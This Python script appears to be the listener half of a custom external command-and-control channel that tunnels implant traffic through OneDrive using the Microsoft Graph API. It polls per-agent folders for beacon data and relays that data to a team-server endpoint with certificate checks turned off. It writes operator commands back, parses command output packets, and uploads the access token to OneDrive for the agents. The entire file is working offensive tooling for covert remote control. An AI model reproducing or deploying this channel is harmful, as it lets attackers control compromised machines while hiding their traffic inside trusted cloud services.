import requests
import json
import time
import base64
import datetime
import struct
import binascii
from msal import ConfidentialClientApplication
import webbrowser
import os

# Configuration
GRAPH_API_URL = "https://graph.microsoft.com/v1.0"
CLIENT_ID = "CLIENT_ID_HERE"
CLIENT_SECRET = "CLIENT_SECRET_HERE"
SCOPES = ["Files.Read.All", "Files.ReadWrite.All", "Files.ReadWrite.AppFolder"]
REDIRECT_URI = "https://oauth.pstmn.io/v1/browser-callback"
TOKEN_FILE = "token.txt"
POLL_INTERVAL = 0.5

def log(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[LISTENER][{timestamp}] {message}")

class TokenManager:
    def __init__(self):
        self.client = ConfidentialClientApplication(
            client_id=CLIENT_ID,
            client_credential=CLIENT_SECRET,
            authority="https://login.microsoftonline.com/common"
        )
        self.access_token = None
        self.refresh_token = None
        self.token_expiry = None
        self.load_token()

    def load_token(self):
        try:
            if os.path.exists(TOKEN_FILE):
                with open(TOKEN_FILE, "r") as f:
                    token_data = json.load(f)
                self.access_token = token_data.get("access_token")
                self.refresh_token = token_data.get("refresh_token")
                self.token_expiry = datetime.datetime.fromtimestamp(
                    token_data.get("expiry", 0) / 1000, tz=datetime.timezone.utc
                )
                log(f"Loaded token from {TOKEN_FILE}")
                if not self.refresh_token:
                    log("No refresh token found in token file")
                    self.initialize_auth()
            else:
                log(f"No token file found at {TOKEN_FILE}")
                self.initialize_auth()
        except Exception as e:
            log(f"Failed to load token: {e}")
            self.initialize_auth()

    def initialize_auth(self):
        log("Initializing authentication")
        authorization_url = self.client.get_authorization_request_url(SCOPES, redirect_uri=REDIRECT_URI)
        log(f"Generated authorization URL: {authorization_url}")
        webbrowser.open(authorization_url)
        authorization_code = input("Enter the authorization code from the redirect URI: ")
        log(f"Received authorization code: {authorization_code}")

        result = self.client.acquire_token_by_authorization_code(
            code=authorization_code,
            scopes=SCOPES,
            redirect_uri=REDIRECT_URI
        )
        if "access_token" in result:
            self.access_token = result["access_token"]
            self.refresh_token = result["refresh_token"]
            expires_in = result["expires_in"]
            self.token_expiry = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=expires_in)
            log(f"Authentication successful. Token expires at {self.token_expiry.isoformat()}")
            self.save_token()
            # Upload to OneDrive
            self.upload_token()
        else:
            error = result.get("error_description", "Unknown error")
            log(f"Authentication failed: {error}")
            raise Exception(f"Failed to acquire token: {error}")

    def save_token(self):
        token_data = {
            "access_token": self.access_token,
            "refresh_token": self.refresh_token,
            "expiry": int(self.token_expiry.timestamp() * 1000)
        }
        try:
            with open(TOKEN_FILE, "w") as f:
                json.dump(token_data, f, indent=2)
            log(f"Saved token to {TOKEN_FILE}")
        except Exception as e:
            log(f"Failed to save token: {e}")

    def upload_token(self):
        headers = {"Authorization": f"Bearer {self.access_token}", "Content-Type": "application/json"}
        token_info = {
            "access_token": self.access_token,
            "expiry": int(self.token_expiry.timestamp() * 1000)
        }
        content = json.dumps(token_info).encode("utf-8")
        url = f"{GRAPH_API_URL}/me/drive/root:/c2/token.txt:/content"
        try:
            response = requests.put(url, headers=headers, data=content)
            if response.status_code in [200, 201]:
                log("Token uploaded to OneDrive")
            else:
                log(f"Failed to upload token: {response.status_code} {response.text}")
        except Exception as e:
            log(f"Failed to upload token to OneDrive: {e}")

    def get_access_token(self):
        current_time = datetime.datetime.now(datetime.timezone.utc)
        if self.access_token and self.token_expiry and self.token_expiry > current_time + datetime.timedelta(minutes=10):
            return self.access_token

        log("Refreshing access token")
        if not self.refresh_token:
            log("No refresh token available")
            self.initialize_auth()

        result = self.client.acquire_token_by_refresh_token(self.refresh_token, scopes=SCOPES)
        if "access_token" not in result:
            log(f"Token refresh failed: {result.get('error_description', 'Unknown error')}")
            self.initialize_auth()
            return self.access_token

        self.access_token = result["access_token"]
        self.refresh_token = result.get("refresh_token", self.refresh_token)
        expires_in = result["expires_in"]
        self.token_expiry = current_time + datetime.timedelta(seconds=expires_in)
        self.save_token()
        self.upload_token()
        log(f"New token expires at {self.token_expiry.isoformat()}")
        return self.access_token

class CustomExternalC2:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.session = requests.Session()
        self.session.verify = False
        log(f"Initialized C2: {endpoint}")

    def transmit(self, data):
        log(f"Sending data: len={len(data)}")
        if len(data) < 16:
            log("Packet too short")
            return b""
        command_id = struct.unpack(">I", data[12:16])[0]
        log(f"Command: {command_id:08x}")
        if command_id == 0x101 and len(data) >= 24:
            subcommand_id = struct.unpack(">I", data[20:24])[0]
            log(f"Subcommand: {subcommand_id:08x}")
            if subcommand_id == 0x200 and len(data) >= 28:
                str_len = struct.unpack(">I", data[24:28])[0]
                log(f"Output length: {str_len}")
                if len(data) >= 28 + str_len:
                    output = data[28:28+str_len].decode("utf-8", errors="ignore")
                    log(f"Output: {output[:50]}...")
                    log(f"Packet (hex): {binascii.hexlify(data).decode()}")
        for attempt in range(3):
            try:
                response = self.session.post(self.endpoint, data=data, timeout=10)
                response.raise_for_status()
                log(f"Received response: len={len(response.content)}")
                return response.content
            except requests.RequestException as e:
                log(f"Transmit failed (attempt {attempt+1}): {e}")
                if attempt == 2:
                    log("Transmit failed after 3 attempts")
                    return b""
            time.sleep(1)
        return b""

def list_folders(path):
    headers = {"Authorization": f"Bearer {token_manager.get_access_token()}"}
    url = f"{GRAPH_API_URL}/me/drive/root:/{path}:/children"
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            items = response.json().get("value", [])
            return [item["name"] for item in items if "folder" in item]
        elif response.status_code == 404:
            log(f"Folder {path} not found")
            return []
        log(f"List folders failed: {response.status_code} {response.text}")
    except requests.RequestException as e:
        log(f"List folders failed: {e}")
    return []

def download_file(path):
    headers = {"Authorization": f"Bearer {token_manager.get_access_token()}"}
    url = f"{GRAPH_API_URL}/me/drive/root:/{path}:/content"
    for attempt in range(3):
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                log(f"Downloaded {path}: len={len(response.content)}")
                return response.content
            elif response.status_code == 404:
                log(f"File {path} not found")
                return b""
            log(f"Download failed: {response.status_code} {response.text}")
        except requests.RequestException as e:
            log(f"Download failed (attempt {attempt+1}): {e}")
        time.sleep(1)
    return b""

def upload_file(path, content):
    headers = {"Authorization": f"Bearer {token_manager.get_access_token()}", "Content-Type": "application/octet-stream"}
    url = f"{GRAPH_API_URL}/me/drive/root:/{path}:/content"
    for attempt in range(3):
        try:
            response = requests.put(url, headers=headers, data=content)
            if response.status_code in [200, 201]:
                log(f"Uploaded to {path}")
                return True
            log(f"Upload failed: {response.status_code} {response.text}")
        except requests.RequestException as e:
            log(f"Upload failed (attempt {attempt+1}): {e}")
        time.sleep(1)
    return False

endpoint = "https://192.168.2.128:40056/ExtEndpoint"
log(f"Starting listener")
try:
    externalc2 = CustomExternalC2(endpoint)
except Exception as e:
    log(f"C2 init failed: {e}")
    exit(1)

token_manager = TokenManager()

while True:
    log("Polling for agent folders")
    folders = list_folders("c2")
    log(f"Found {len(folders)} agent folders")

    for agent_id in folders:
        log(f"Checking agent {agent_id}")
        folder_path = f"c2/{agent_id}"

        # Read agent data
        content = download_file(f"{folder_path}/data.txt")
        if content:
            try:
                decoded = base64.b64decode(content)
                log(f"Decoded {folder_path}/data.txt: len={len(decoded)}")
                response = externalc2.transmit(decoded)
                log(f"C2 response: len={len(response)}")
                encoded_response = base64.b64encode(response).decode("utf-8")
                if upload_file(f"{folder_path}/commands.txt", encoded_response.encode("utf-8")):
                    log(f"Wrote {folder_path}/commands.txt")
                    upload_file(f"{folder_path}/data.txt", b"")  # Clear data.txt
                else:
                    log(f"Failed to write {folder_path}/commands.txt")
            except base64.binascii.Error as e:
                log(f"Decode {folder_path}/data.txt failed: {e}")
                upload_file(f"{folder_path}/data.txt", b"")  # Clear invalid data
    
    time.sleep(POLL_INTERVAL)